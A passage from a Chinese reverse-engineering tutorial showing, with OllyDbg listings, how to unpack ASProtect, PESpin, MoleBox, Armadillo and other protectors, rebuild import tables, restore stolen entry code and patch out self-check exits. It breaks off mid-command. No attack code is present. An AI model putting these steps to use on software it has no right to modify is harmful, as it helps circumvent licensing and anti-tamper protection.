1.2\n\n选项->调试设置->异常，将所有异常取消勾选。用最后一次异常法，Shift+F9运行19次。在`retn`处F2->Shift+F9->F2。去到`M`模块，在401000处下断运行，直接去到OEP。\n\n```asm\n0040A41E    55              push ebp\n0040A41F    8BEC            mov ebp,esp\n0040A421    6A FF           push -0x1\n0040A423    68 C8CB4000     push 跑跑赛道.0040CBC8\n0040A428    68 A4A54000     push 跑跑赛道.0040A5A4\n```\n\n### 4.13.2 ASProtect 1.23 RC1\n\n取消勾选“非法内存访问”，最后一次异常法。Shift+F9运行16次。用4.13.1的方法找到OEP。\n\n也可以用另一种方法。运行到`retn`后，查看堆栈窗口的`400000`下的第二行的数值`12FFA4`。在命令窗口下硬件断点`hr 12FFA4`，运行，F8经过一个大跳转也可去到OEP。\n\n```asm\n0012FF5C   00A0381C\n0012FF60   00400000  跑跑排行.00400000\n0012FF64   3D375BA5\n0012FF68   0012FFA4\n```\n\n脱壳正常运行。\n\n也可以用asprdbgr脱壳辅助工具打开加壳程序，让它自动修复IAT，打开importREC发现只有3个无效指针了，直接剪切掉。同样可以运行。\n\n### 4.13.3 ASProtect 1.23 RC4\n\n判断ASProtect版本：\n\n1. ASProtect 1.23 RC4 按shift+f9键26次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到fake oep。\n\n\n2. ASProtect 1.31 04.27 按shift+f9键36次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n3. ASProtect 1.31 05.18 按shift+f9键40次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n4. ASProtect 1.31 06.14 按shift+f9键38次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n用最后一次异常法可能判断不准确，也可以用PEID的VerA插件区分版本。\n\n{% asset_img ASProtect123rc4.jpg ASProtect123rc4 %}\n\n[1]表示上述第一个版本RC4。\n\n取消勾选“非法访问内存”，Shift+F9运行26次，在`retn`处F2->Shift+F9->F2。去到`M`模块，在401000处下断运行，直接去到FOEP。\n\n```asm\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n004F27D5    33D2            xor edx,edx                              ; ntdll.KiFastSystemCallRet\n004F27D7    8AD4            mov dl,ah\n004F27D9    8915 34306900   mov dword ptr ds:[0x693034],edx          ; ntdll.KiFastSystemCallRet\n```\n\n找回被偷代码，取消勾选“非法访问内存”，Shift+F9运行26次，在`retn`处F2->Shift+F9->F2。查看堆栈窗口的`400000`往下数第二行数值为`12FFA4`，在命令窗口输入`hr 12FFA4`下硬件断点，运行。\n\n```asm\n0012FF5C   00C86804\n0012FF60   00400000  SoWorker.00400000\n0012FF64   E3DE7228\n0012FF68   0012FFA4\n```\n\n一路F8跟到以下，call跟进去。\n\n```asm\n00C8544B    BD 5154C800     mov ebp,0xC85451\n00C85450    FF55 03         call dword ptr ss:[ebp+0x3]\n```\n\n发现类似于OEP开头：\n\n```asm\n00C8547A    55              push ebp\n00C8547B    8BEC            mov ebp,esp\n00C8547D    6A FF           push -0x1\n00C8547F    68 78E35300     push 0x53E378\n00C85484    68 407B4F00     push 0x4F7B40\n00C85489    64:A1 00000000  mov eax,dword ptr fs:[0]\n00C8548F   /EB 01           jmp short 00C85492\n```\n\n将jmp以上(不包含jmp)的代码二进制复制\n\n```asm\n55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00\n```\n\n执行jmp到以下代码，再复制\n\n```asm\n00C85492    50              push eax\n00C85493    64:8925 0000000>mov dword ptr fs:[0],esp\n00C8549A    83EC 58         sub esp,0x58\n00C8549D    EB 01           jmp short 00C854A0\n```\n\n```asm\n50 64 89 25 00 00 00 00 83 EC 58\n```\n\n以此类推\n\n```asm\n00C854A0    53              push ebx\n```\n\n```asm\n53\n```\n\n```asm\n00C854A4    56              push esi\n```\n\n```asm\n56\n```\n\n```asm\n00C854A8    57              push edi                                 ; SoWorker.006CF040\n00C854A9    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n00C854AC    26:eb 01        jmp short 00c854b0\n```\n\n```asm\n57 89 65 E8\n```\n\n汇总一下代码：\n\n```asm\n55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58 53 56 57 89 65 E8\n```\n\n一路F7到这里，再一路F8去到`retn`，返回父函数。\n\n```asm\n00C85378    51              push ecx\n00C85379    57              push edi                                 ; SoWorker.006CF040\n00C8537A    9C              pushfd\n00C8537B    FC              cld\n00C8537C    BF B953C800     mov edi,0xC853B9\n00C85381    B9 5E140000     mov ecx,0x145E\n00C85386    F3:AA           rep stos byte ptr es:[edi]\n00C85388    9D              popfd\n00C85389    5F              pop edi                                  ; SoWorker.004F27CF\n00C8538A    59              pop ecx                                  ; SoWorker.004F27CF\n00C8538B    C3              retn\n```\n\n直接来到FOEP，上面全为0是因为真正的OEP被移到了别处，刚才所做的操作就是把OEP拼接起来。\n\n```asm\n004F27C9    0000            add byte ptr ds:[eax],al\n004F27CB    0000            add byte ptr ds:[eax],al\n004F27CD    0000            add byte ptr ds:[eax],al\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n```\n\n将刚才复制的代码粘贴在它的上方。\n\n```asm\n004F27A9    55              push ebp\n004F27AA    8BEC            mov ebp,esp\n004F27AC    6A FF           push -0x1\n004F27AE    68 78E35300     push SoWorker.0053E378\n004F27B3    68 407B4F00     push SoWorker.004F7B40\n004F27B8    64:A1 00000000  mov eax,dword ptr fs:[0]\n004F27BE    50              push eax\n004F27BF    64:8925 0000000>mov dword ptr fs:[0],esp\n004F27C6    83EC 58         sub esp,0x58\n004F27C9    53              push ebx\n004F27CA    56              push esi\n004F27CB    57              push edi                                 ; SoWorker.006CF040\n004F27CC    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n```\n\n设置EIP指向第一条指令。脱壳。\n\n### 4.13.4 以壳解壳\n\nStolen Code太多，可以用以壳解壳的方法。以壳解壳就是将Stolen Code及Stolen Code所在区段的壳一并放在主程序里。这样会导致比无壳程序多了很多无用代码，文件大小比无壳程序大很多。\n\n与4.13.3操作几乎一致。由于它有ASLR，所以地址与4.13.3会有所不同。FOEP为`4F27CF`，OEP为`C871DE`。\n\n打开LoadPE，修正镜像大小，先完整转存一个，再区域转存OEP所在的区段。在PE编辑器打开脱壳程序，区段->选中最后一个区段右键->从磁盘载入区段，将我们刚才保存的区段载入，右键->编辑区段，程序基址为400000，所在区段起始地址为C80000，所以虚拟地址应为C80000-400000=880000。保存->确定。\n\n选项->重建->只选“使PE有效”。重建PE->载入脱壳程序。\n\n用importREC修复IAT，OEP先填写FOEP，修复好指针后再修改OEP为真正的OEP。程序正常运行。\n\n# 5. 疑难杂症\n\n## 5.1 附加数据的处理方法\n\n{% asset_img 附加数据.png 附加数据 %}\n\nPEID查壳是NSPacK壳，后面写着[overlay]，也就是这个程序有附加数据。\n\noverlay真正的意思是取消打开功能，将这些需要读取的数据放到pe文件的后面，让程序自动运行打开的功能。比如mp3文件需要播放器打开，那mp3文件除了音乐数据还需要附加数据，让播放器读到能通过播放器运行。\n\n如果单纯用NSPacK脱壳方法还不足够，会发现脱壳后的程序运行不了。正确方法是将加壳程序后面的附加数据粘贴到脱壳程序的后面。\n\n用PEID查看区段信息，重点关注最后一个区段的R偏移和R大小。\n\n{% asset_img 附加数据节查看器.jpg 附加数据节查看器 %}\n\n8800h+400h=8C00h\n\n用Win HEX打开加壳程序，Alt+G搜索偏移`8C00`，选第一个字节右键->选块开始，选文件最后一个字节右键->选块结束，右键->编辑->复制选块->正常。打开脱壳后的程序，选中最后一个字节，右键->编辑->剪贴板数据->粘贴，保存。程序正常运行。\n\n## 5.2 自校验的去除方法\n\n用了以上各种方法修复程序都运行不了，可以考虑可能是程序有自校验。\n\n自校验原理：程序会检查自己有没有被修改，如果发现被修改的话，便会离开或进行其它动作。基本的校检方法包括checksum，检查大小，检查跳转代码，等等。\n\n 将脱壳后的程序也用OD载入，在两个OD的命令窗口下断点`bp CreateFileA`回车，Alt+F9执行到用户代码，取消断点。接下来对比两个程序执行的不同之处，主要看条件跳转指令。\n\n```asm\n0040120C   /75 07           jnz short 例子.00401215\n0040120E   |B8 01000000     mov eax,0x1\n00401213   |EB 02           jmp short 例子.00401217\n00401215   \\33C0            xor eax,eax\n```\n\n加壳程序这个跳转不实现，而脱壳程序的这个跳转实现了。只要将脱壳程序的跳转指令修改即可。\n\n```asm\njnz short 例子.00401215\t=>\tjz short 例子.00401215\n```\n\n保存后程序正常运行。\n\n# 6. 脱壳后的简单应用\n\n程序的破解、汉化、美化都要先脱壳才能进行。\n\n## 6.1 软件汉化及DIY \n\n### 6.1.1 VB类\n\nVB程序最好用GetVBRes工具。\n\n### 6.1.2 VC++/VS类\n\nVC++/VS程序可以用Resource Hacker、PEexplorer、xnresource工具。\n\n脱完壳后加载进Resource Hacker，还是显示“有非标准资源”错误提示，说明我们手工脱壳没脱干净，可能在重建IAT时大小设置为1000，导致有很多垃圾指针。可以用fixres修复一下脱壳后的程序。\n\n### 6.1.3 BC++类/Delphi\n\nBC++/Delphi类最好用PEexplorer工具。\n\n# 7. 脱壳练习\n\n## 7.1 kkrunchy 0.23\n\n单步到`push`后用ESP定律，继续F8往下，看到一个大跳转，却没有实现。\n\n```asm\n003FFD5B   /0F84 9F190000   je UnPackMe.00401700\n```\n\n选中右键->跟随，是一大片空代码。右键->断点->硬件执行->F9，原本空代码的地方已经出现了OEP，删除硬件断点。\n\n```asm\n00401700    55              push ebp                                 ; UnPackMe.003F2A08\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 86184000     push UnPackMe.00401886\n```\n\n用单步跟踪、内存镜像法都是要在大跳转那里同样操作才可到达OEP。\n\n脱壳。注意它的基址是`3F0000`，所以OEP的偏移地址为`11700`。\n\n## 7.2 AT4RE Protector\n\nPEID显示yoda's Protector v1.02\n\n载入OD用2次内存镜像法，在`.rsrc`资源段设置内存访问断点(A)，设置访问中断(F2)断不下来，因为会去到DLL领空，记得要取消内存断点。再在PE文件头下一行下访问中断，运行，到达以下：\n\n```asm\n00407101    8A1C06          mov bl,byte ptr ds:[esi+eax]\n00407104    80EB FF         sub bl,0xFF\n00407107    881C06          mov byte ptr ds:[esi+eax],bl\n0040710A    46              inc esi\n0040710B    83FE 32         cmp esi,0x32\n0040710E  ^ 75 F1           jnz short UnPackMe.00407101\n00407110  - FFE0            jmp eax                                  ; UnPackMe.00401700\n```\n\n单步跟到`jmp eax`去到OEP。\n\n## 7.3 ORiEN v2.11 - 2.12\n\n开始用ESP定律，再单步几下就到了OEP。\n\n```asm\n004A1AF1  - FFE0            jmp eax                                  ; UnPackMe.0045159C\n```\n\n```asm\n0045159C    55              push ebp\n0045159D    8BEC            mov ebp,esp\n0045159F    83C4 F0         add esp,-0x10\n004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE \";\"\n```\n\n修复时直接删除无效指针，剪切指针程序会出错。\n\n## 7.4 MoleBox V2.6.5\n\n单步跟，跑飞的函数跟进去，就可跟到OEP。(ESP定律也行)\n\n```asm\n0045159C    55              push ebp\n0045159D    8BEC            mov ebp,esp\n0045159F    83C4 F0         add esp,-0x10\n004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE \";\"\n```\n\n脱壳，重建输入表时，有很多无效函数，用跟踪1全部修复。\n\n{% asset_img MoleBox.jpg MoleBox %}\n\nPEID显示无壳，但是程序不能运行。重新操作一次回到无效函数那里，看其中一个无效函数的RVA`55170`，在OD命令窗口输入`d 455170`。\n\n```asm\n00455170  00477189  UnPackMe.00477189\n```\n\n发现它是程序函数，而不是系统函数，重建表中应该全是系统函数才对。猜测它是被壳加密了。\n\n在OD重载一下程序，再次`d 455170`，这时这个地址什么都没有。\n\n```asm\n00455170  965AB0EB\n```\n\n右键->断点->硬件访问。Shift+F9直至这个地址出现系统函数。此时处于未加密状态。而这个函数与跟踪1修复函数的名字完全不一样，所以跟踪修复不一定正确。\n\n```asm\n00455170  7C801D53  kernel32.LoadLibraryExA\n```\n\n现在单步跟踪观察是哪一步让它变成程序函数。执行完下面这一步时，函数改变。也就是说这一步导致IAT重建时RVA为`55170`地址的函数无效。\n\n```asm\n00471682    8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189\n```\n\n为了不让它改变，往上找能绕过这个指令的跳转指令，这个跳转指令称为magic jump\n\n```asm\n00471658   /74 45           je short UnPackMe.0047169F\n0047165A   |8D55 F0         lea edx,dword ptr ss:[ebp-0x10]\n0047165D   |52              push edx                                 ; UnPackMe.0047D378\n0047165E   |6A 04           push 0x4\n00471660   |6A 04           push 0x4\n00471662   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n00471665   |50              push eax                                 ; UnPackMe.00477189\n00471666   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect\n0047166C   |85C0            test eax,eax                             ; UnPackMe.00477189\n0047166E   |75 0A           jnz short UnPackMe.0047167A\n00471670   |B9 0B0000EF     mov ecx,0xEF00000B\n00471675   |E8 9D2F0000     call UnPackMe.00474617\n0047167A   |8B4D 08         mov ecx,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n0047167D   |8B55 F8         mov edx,dword ptr ss:[ebp-0x8]           ; UnPackMe.0047D378\n00471680   |8B02            mov eax,dword ptr ds:[edx]               ; UnPackMe.00477189\n00471682   |8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189\n00471684   |8D4D F4         lea ecx,dword ptr ss:[ebp-0xC]\n00471687   |51              push ecx                                 ; UnPackMe.00455170\n00471688   |8B55 F0         mov edx,dword ptr ss:[ebp-0x10]\n0047168B   |52              push edx                                 ; UnPackMe.0047D378\n0047168C   |6A 04           push 0x4\n0047168E   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n00471691   |50              push eax                                 ; UnPackMe.00477189\n00471692   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect\n00471698   |C745 FC 0100000>mov dword ptr ss:[ebp-0x4],0x1\n0047169F   \\8B45 FC         mov eax,dword ptr ss:[ebp-0x4]\n```\n\n重载，同样操作走一次，将je指令修改为jmp指令。Ctrl+G去到OEP，下断点运行，发现信息窗口的这个地址还是系统函数。\n\n```asm\n00455170  7C801D53  kernel32.LoadLibraryExA\n```\n\n重建IAT时已经所有函数都有效了。脱壳，正常运行。\n\n## 7.5 PESpin 1.32(Stolen Code)\n\nESP定律，Shift+F9运行。单步跟踪发现破碎OEP。\n\n```asm\n00408D09    55              push ebp\n00408D0A   /EB 01           jmp short UnPackMe.00408D0D\n00408D0C   |3D 8BECEB01     cmp eax,0x1EBEC8B\n00408D11    2F              das\n00408D12    6A FF           push -0x1\n00408D14    EB 01           jmp short UnPackMe.00408D17\n00408D16    0C 68           or al,0x68\n00408D18    8890 BF01812C   mov byte ptr ds:[eax+0x2C8101BF],dl\n00408D1E    24 88           and al,0x88\n00408D20    6B7F 01 68      imul edi,dword ptr ds:[edi+0x1],0x68\n00408D24    ed              in eax,dx\n00408D25    8824EE          mov byte ptr ds:[esi+ebp*8],ah\n00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99\n00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]\n00408D35    EB 01           jmp short UnPackMe.00408D38\n00408D37    CE              into\n00408D38    50              push eax\n00408D39    EB 01           jmp short UnPackMe.00408D3C\n```\n\n汇总一下：\n\n```asm\n00408D09    55              \tpush ebp\n00408D0D    8BEC            \tmov ebp,esp\n00408D12    6A FF           \tpush -0x1\n00408D17    68 8890BF01     \tpush 0x1BF9088\n;00408D1C    812C24 886B7F01 \tsub dword ptr ss:[esp],0x17F6B88 这个在其他OEP好像没有，去掉(因为OEP不够内存)\n00408D23    68 ED8824EE     \tpush 0xEE2488ED\n;00408D28    810424 998F1B12 \tadd dword ptr ss:[esp],0x121B8F99 这个在其他OEP好像没有，去掉\n00408D2F    64:A1 00000000  \tmov eax,dword ptr fs:[0]\n00408D38    50              \tpush eax\n00408D3C    64:8925 00000000     mov dword ptr fs:[0],esp\n00408D46    83EC 68              sub esp,0x68\n00408D4C    53                   push ebx\n00408D50    56                   push esi\n00408D54    57                   push edi\n00408D58    8965 E8              mov dword ptr ss:[ebp-0x18],esp\n00408D5E    33DB                 xor ebx,ebx\n00408D63    895D FC              mov dword ptr ss:[ebp-0x4],ebx\n00408D69    6A 02                push 0x2\n00408D6E    FF15 90214000        call dword ptr ds:[0x402190]             ; msvcrt.__set_app_type\n00408D77    59                   pop ecx\n00408D7B    830D 2C314000 FF     or dword ptr ds:[0x40312C],-0x1\n00408D85    830D 30314000 FF     or dword ptr ds:[0x403130],-0x1\n00408D8F    FF15 8C214000        call dword ptr ds:[0x40218C]             ; msvcrt.__p__fmode\n```\n\n二进制代码汇总：\n\n```\n55 8B EC 6A FF 68 88 90 BF 01 68 ED 88 24 EE 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68 53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 90 21 40 00 59 83 0D 2C 31 40 00 FF 83 0D 30 31 40 00 FF FF 15 8C 21 40 00\n```\n\n终于到达大跳转：\n\n```asm\n00408D98  - E9 AB89FFFF          jmp UnPackMe.00401748\n```\n\nFOEP：\n\n```asm\n00401748    8B0D 20314000        mov ecx,dword ptr ds:[0x403120]\n0040174E    8908                 mov dword ptr ds:[eax],ecx\n00401750    FF15 88214000        call dword ptr ds:[0x402188]             ; msvcrt.__p__commode\n```\n\n二进制粘贴到FOEP上方，将`401700`作为新EIP。\n\n```asm\n00401700      55                 push ebp\n00401701      8BEC               mov ebp,esp\n00401703      6A FF              push -0x1\n00401705      68 8890BF01        push 0x1BF9088\n0040170A      68 ED8824EE        push 0xEE2488ED\n0040170F      64:A1 00000000     mov eax,dword ptr fs:[0]\n00401715      50                 push eax                                 ;  msvcrt._fmode\n00401716      64:8925 00000000   mov dword ptr fs:[0],esp\n0040171D      83EC 68            sub esp,0x68\n00401720      53                 push ebx\n00401721      56                 push esi\n00401722      57                 push edi\n00401723      8965 E8            mov dword ptr ss:[ebp-0x18],esp\n00401726      33DB               xor ebx,ebx\n00401728      895D FC            mov dword ptr ss:[ebp-0x4],ebx\n0040172B      6A 02              push 0x2\n0040172D      FF15 90214000      call dword ptr ds:[0x402190]             ;  msvcrt.__set_app_type\n00401733      59                 pop ecx                                  ;  005BFFD0\n00401734      830D 2C314000 FF   or dword ptr ds:[0x40312C],-0x1\n0040173B      830D 30314000 FF   or dword ptr ds:[0x403130],-0x1\n00401742      FF15 8C214000      call dword ptr ds:[0x40218C]             ;  msvcrt.__p__fmode\n00401748   .  8B0D 20314000      mov ecx,dword ptr ds:[0x403120]\n```\n\n重建IAT用importREC不行，但用Scylla脱壳成功，程序正常运行。\n\n## 7.6 eXPressor 1.3.0(VB自校验处理)\n\n单步去到大跳转。\n\n```asm\n00407D00  |.- FFE0          jmp eax                                  ;  UnPackMe.004012A0\n```\n\n去到OEP。\n\n```asm\n0040129A  - FF25 AC104000   jmp dword ptr ds:[<&msvbvm60.#ThunRTMain_100>]     ; msvbvm60.ThunRTMain\n004012A0 >  68 582E4000     push dumped_.00402E58\n004012A5    E8 F0FFFFFF     call <jmp.&msvbvm60.#ThunRTMain_100>\n```\n\n脱壳后还是运行不了，因为本来就是要考自校验的问题。\n\n将脱壳后的程序载入OD，在命令窗口输入`bpx papa`去到调用模块。\n\n方法一：找到目标为`__vbaNew2`，`__vbaNew2`的功能是调用程序的子窗口或子函数。根据分析(？)，它调用了退出函数。\n\n右键->在每个调用到`__vbaNew2`上设置断点。一个一个看。往上拉紧挨的cmp与跳转指令要格外关注，F4运行到`cmp`指令后，观察跳转指令是否绕过退出函数。绕过则不管它，没绕过将跳转实现。\n\n```asm\n00403D2A    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n00403D30    75 10           jnz short dumped_.00403D42;跳转实现，不管\n00403D32    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n00403D37    68 2C384000     push dumped_.0040382C\n00403D3C    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n00403D42    8B35 E0524000   mov esi,dword ptr ds:[0x4052E0]\n```\n\n看到有两个`cmp`与`jnz`组合，先F4、F8走一下看它是怎么运行的。\n\n```asm\n00403F35    66:395D E4      cmp word ptr ss:[ebp-0x1C],bx\n00403F39    75 56           jnz short dumped_.00403F91;不实现\n00403F3B    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n00403F41    75 10           jnz short dumped_.00403F53;实现\n00403F43    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n00403F48    68 2C384000     push dumped_.0040382C\n00403F4D    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n```\n\n如果jnz不修改，F9出现异常。如果jnz修改为jmp，F9程序正常终止。所以第一个`jnz`应该修改为`jmp`。\n\n又来两个`cmp`与跳转指令结合\n\n```asm\n00404295    817D E4 C05D000>cmp dword ptr ss:[ebp-0x1C],0x5DC0\n0040429C    7E 54           jle short dumped_.004042F2;不实现\n0040429E    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n004042A4    75 10           jnz short dumped_.004042B6;实现\n004042A6    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n004042AB    68 2C384000     push dumped_.0040382C\n004042B0    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n```\n\n如果jnz不修改，F9出现正常终止。如果jnz修改为jmp，F9程序弹出主程序。所以`jle`应该修改为`jmp`。\n\n因为已经可以出现主程序了，所以后面的调用可以不管它。保存两处修改，程序可以跑起来。\n\n## 7.7  **delphi自效验的处理** \n\n是FSG 2.0的壳，上面有说，不再赘述。在修复时，会发现只有3个指针，这种情况是不可能有的，所以要手动查找IAT指针。\n\n```asm\n0045273F    A1 E03F4500     mov eax,dword ptr ds:[0x453FE0]\n```\n\n在窗口命令输入`d 453FE0`，发现全是程序函数还有ASCII码，不是我们要找的IAT指针。\n\n```asm\n00453FE0  00455BB0  UnPackMe.00455BB0\n00453FE4  00453014  UnPackMe.00453014\n00453FE8  00407138  ASCII \"dVE\"\n00453FEC  0041ADD0  ASCII \"dVE\"\n```\n\n往下滑啊滑啊(Zzz...)，终于来到IAT，起始地址`45612C`，末尾`456738`，大小`456738-45612C=60C`\n\n```asm\n00456128  00000000\n0045612C  7C93135A  ntdll.RtlDeleteCriticalSection\n00456130  7C9210E0  ntdll.RtlLeaveCriticalSection\n```\n\n脱壳后的程序没有弹出错误提示，双击“运行不了”的情况，大多数是程序有自校验的问题，它是运行了又退出了。\n\n与7.6一样，在命令窗口输入`bp FindFirstFileA`（dll领空）下断避免后续程序跑飞。在命令窗口输入`bpx papa`，找到`EixtProcess`函数下断(因为7.6找不到这个函数，经过分析得出`__vbaNew2`调用退出函数)。\n\nF9，运行到dll领空Alt+F9返回。再F9运行到达某个退出函数断点处。这是switch语句执行default时的代码。\n\n```asm\n004523A6   > \\50            push eax                                 ;  Default case of switch 00451FB8\n004523A7   .  89D8          mov eax,ebx\n004523A9   .  29D8          sub eax,ebx\n004523AB   .  89C3          mov ebx,eax\n004523AD   .  89D8          mov eax,ebx\n004523AF   .  01D8          add eax,ebx\n004523B1   .  89C3          mov ebx,eax\n004523B3   .  58            pop eax\n004523B4   .  6A 00         push 0x0                                 ; /ExitCode = 0x0\n004523B6   .  E8 F540FBFF   call <jmp.&kernel32.#ExitProcess_183>    ; \\ExitProcess\n```\n\n上下找一下发现只有`case 2E4E9`没有退出函数。\n\n```asm\n004523BB   > \\33C0          xor eax,eax                              ;  Case 2E4E9 of switch 00451FB8\n```\n\n这个地址跳转来自很多，但只有一个是条件跳转`0045208C`，往上看在`00452085`下断点，重载运行几下运行发现可以停在这里。jg不要实现，因为我们想在je跳转。\n\n```asm\n00452085   > \\3D E9E40200   cmp eax,0x2E4E9\n0045208A   .  7F 6A         jg short dumped_.004520F6\n0045208C   .  0F84 29030000 je dumped_.004523BB\n```\n\n修改一下\n\n```asm\n0045208A      90            nop\n0045208B      90            nop\n0045208C      E9 2A030000   jmp dumped_.004523BB\n```\n\n一路F8，在这又遇到了`2E4E9`，运行到jnz实现了，按道理它实现就不让它实现，nop掉。\n\n```asm\n00452775  |.  3D E9E40200   cmp eax,0x2E4E9\n0045277A  |.  75 0C         jnz short dumped_.00452788\n```\n\n一路F8，又遇到了`2E4E9`，je要改为jmp，要不然就退出了。\n\n```asm\n00452419  |.  3D E9E40200   cmp eax,0x2E4E9\n0045241E  |.  74 07         je short dumped_.00452427\n00452420  |.  6A 00         push 0x0                                 ; /ExitCode = 0x0\n00452422  |.  E8 8940FBFF   call <jmp.&kernel32.#ExitProcess_183>    ; \\ExitProcess\n00452427  |>  33C0          xor eax,eax\n```\n\n修改完这3处，程序正常运行。结果OD不能选择所有修改(我的原因)，那就修改一处保存一次重载新程序一次。\n\n## 7.8 GHF Protector V1.0\n\n脱壳的最佳时机：手动脱壳理想的最佳dump时机是指壳已经把程序代码包括资源等数据全部解密、输入表等数据还原但未填充系统函数地址、dll还没重定位，此时dump出来的文件只需修正OEP、ImportTableRVA等信息即可正常运行完成脱壳。\n\nPEID查壳说是ASProtect 1.32的壳，但载入OD的壳特征明显不是ASProtect，并且程序的图标也被隐藏了。题目给了这是GHF Protector V1.0的壳。(可能不同程序入口代码不同)\n\n```asm\n00511709 >  50              push eax\n0051170A    7C 05           jl short UnPackMe.00511711\n0051170C    52              push edx                                 ; ntdll.KiFastSystemCallRet\n0051170D    c1c4 80         rol esp,0x80\n00511710    5A              pop edx                                  ; kernel32.7C817077\n00511711    58              pop eax                                  ; kernel32.7C817077\n```\n\n### 7.8.1 最佳脱壳时机\n\n在`M`模块，`.idata`下断，Shift+F9运行，F7、F8走到这，这里是最佳的脱壳时机。算是这个壳的一个特征，三个跳转指令，且有`0x80000000`和`0x7FFFFFFF`。\n\n```asm\n005114A2   /74 2A           je short UnPackMe.005114CE\n005114A4   |F7C2 00000080   test edx,0x80000000\n005114AA   |74 08           je short UnPackMe.005114B4\n005114AC   |81E2 FFFFFF7F   and edx,0x7FFFFFFF\n005114B2   |EB 04           jmp short UnPackMe.005114B8\n```\n\n用PEtools半脱壳，设置PEtools选项：\n\n{% asset_img GHF_PEtools.jpg GHF_PEtools %}\n\n或者用LoadPE半脱壳，在选项设置一下：\n\n{% asset_img GHF_PE设置.png GHF_PE设置 %}\n\n不要修正镜像大小，否则不能抓取进程。程序正常运行，但壳还没脱干净。\n\n再将半脱壳后的程序载入OD，用ESP定律找到OEP。LoadPE脱壳，还原默认设置。\n\n{% asset_img PE默认.png PE默认 %}\n\nimportREC重建IAT，脱壳成功。\n\n### 7.8.2 使用LoadLibraryA\n\n在命令窗口输入`bp LoadLibraryA`回车，Shift+F9运行8次后，Alt+F9返回，取消断点，单步跟踪。(不知道为什么是8次)\n\n到达这里，edx=00401700，是一个大跳转。\n\n```asm\n0040729F  ^\\FFE2            jmp edx\n```\n\nF8到达OEP。\n\n用LoadPE，按7.8.1设置PE选项，程序可以运行，但壳还没脱干净，重建IAT即可。如果按PE默认，PEID显示这不是一个有效的PE文件。\n\n或者用PEtools，按如下设置，重建IAT就可成功运行。\n\n{% asset_img GHF_PEtools.jpg GHF_PEtools %}\n\n### 7.8.3 使用GlobalFree\n\n在命令窗口输入`bp GlobalFree`回车，Shift+F9，再Alt+F9，取消断点，单步跟踪也能去到OEP。\n\n## 7.9 Armadillo(穿山甲) 6.04\n\n穿山甲需要处理Magic jump，都有IAT加密。\n\n### 7.9.1 使用GetModuleHandleA+9/+5\n\n忽略所有异常，在StrongOD中勾选“跳过某些异常”。在命令窗口输入`bp GetModuleHandleA+9`下断，Shift+F9运行N次，直到堆栈窗口出现：\n\n```asm\n001293E4 /0012EB40\n001293E8 |00B88683 RETURN to 00B88683 from kernel32.GetModuleHandleA\n001293EC |00BB514C ASCII \"kernel32.dll\"\n001293F0 |00BB6D64 ASCII \"VirtualFree\"\n001293F4 |0EF6D207\n001293F8 |00454380 UnPackMe.00454380\n```\n\n再Shift+F9一次，Alt+F9返回，单步到Magic Jump，将它nop掉。(我也不知道为什么这里是Magic Jump)\n\n```asm\n00B6AA13   /75 05           jnz short 00B6AA1A;nop\n```\n\n往下拉到这里，F4运行到此处，再撤销刚才对Magic Jump的修改。因为穿山甲会检测某种保护下壳的完整性。\n\n```asm\n00B6AC9A   /EB 03           jmp short 00B6AC9F\n```\n\n接着再下第二个断点`bp CreateThread`，Shift+F9运行。再Alt+F9返回。\n\n```asm\n00B7614C    50              push eax\n00B7614D    FF15 9032BB00   call dword ptr ds:[0xBB3290]             ; kernel32.CloseHandle\n00B76153    5E              pop esi                                  ; UnPackMe.00454380\n```\n\n单步跟踪到这，F7进入即可到达OEP。\n\n```asm\n00B930E5    FFD2            call edx                                 ; UnPackMe.00401700\n```\n\n或者不下第二个断点，在`M`模块的`.text`下断运行，单步跟踪到上面指令再F7进入OEP。\n\n```asm\n00401700    55              push ebp\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 86184000     push UnPackMe.00401886\n```\n\n常规脱壳即可。\n\n### 7.9.2 使用VirtualProtect\n\n在命令窗口输入`bp 